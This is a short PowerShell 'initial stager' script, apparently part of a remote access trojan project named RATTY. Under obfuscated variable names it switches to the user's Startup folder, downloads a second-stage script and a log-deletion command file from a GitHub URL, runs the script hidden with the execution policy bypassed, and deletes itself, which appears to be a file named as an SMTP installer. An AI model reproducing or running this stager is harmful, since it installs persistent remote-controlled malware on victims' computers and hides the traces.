
# intial stager
# created by ali abbass
# Get intial /current path
$eMEbXSRHpU=Get-Location



# write-Host "Current working directory remove-item -fo  $curdir"
$mWjZRdpvnM=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$QEXcMiaOoG=$mWjZRdpvnM.split("\")
$lYIbKdtBmp=$QEXcMiaOoG[1]
# write-host "$username"

# move into startup directore
$GtgdfjFhLV="C:\Users\$lYIbKdtBmp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
Set-Location -Path $GtgdfjFhLV 



$CsBNyfvnUe = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $CsBNyfvnUe
Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/wget.ps1" -OutFile "IctLDiYOQb.ps1"
Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/del_log.cmd" -OutFile "AmRvjYQbUz.cmd"

"Powershell.exe -executionpolicy Bypass -windowstyle hidden -File  IctLDiYOQb.ps1"| cmd


# back into your current directory

Set-Location -Path $eMEbXSRHpU


remove-item -fo smtp-installer.ps1
